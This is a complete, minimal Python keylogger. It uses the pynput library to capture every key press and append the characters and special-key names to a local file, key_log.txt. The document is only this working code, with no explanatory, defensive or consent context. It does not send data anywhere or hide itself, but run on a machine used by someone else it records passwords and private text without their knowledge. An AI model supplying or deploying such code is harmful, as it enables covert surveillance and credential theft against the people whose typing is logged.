from pynput import keyboard

def keypress_logger(key):
    with open("key_log.txt", 'a') as log_file:
        try:
            log_file.write(key.char)
        except AttributeError:
            log_file.write(f'[{key}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=keypress_logger) as listener:
        listener.join()
